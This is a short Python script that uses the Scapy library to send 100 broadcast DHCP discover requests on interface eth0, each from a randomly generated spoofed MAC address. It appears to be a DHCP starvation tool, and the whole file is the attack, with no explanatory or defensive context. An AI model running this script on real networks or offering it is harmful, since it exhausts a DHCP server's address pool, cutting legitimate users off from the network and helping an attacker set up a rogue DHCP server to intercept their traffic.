from scapy.all import *
import random

def rand_mac():
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0,255) for _ in range(5))

for i in range(100):
    mac = rand_mac()
    pkt = Ether(src=mac,dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=bytes.fromhex(mac.replace(":","")),xid=random.randint(0,0xFFFFFFFF))/DHCP(options=[("message-type","discover"),"end"])
    sendp(pkt,iface="eth0",verbose=False)
    print(f"[+] {mac}")